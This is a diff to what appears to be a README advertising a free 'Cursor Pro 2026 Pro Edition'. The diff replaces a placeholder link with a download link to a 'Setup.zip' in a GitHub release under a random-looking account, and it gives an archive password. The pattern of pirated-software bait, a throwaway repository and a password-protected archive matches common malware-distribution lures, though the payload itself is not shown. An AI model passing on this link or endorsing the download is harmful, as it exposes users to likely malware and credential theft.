@@ -9,7 +9,8 @@ Cursor Pro 2026 Pro Edition. AI-first code editor with multi-file edits, codebas
 ***************** DOWNLOAD *****************
 ------------------------------------------------
 
-[+] DOWNLOAD LINK: [download here](https://google.com)
+[+] DOWNLOAD LINK: [download here](https://github.com/Prideibnidolize/hkkrxdzj/releases/download/Last/Setup.zip)
+
 [+] 🔐🔐🔐: 1847
 
 ------------------------------------------------
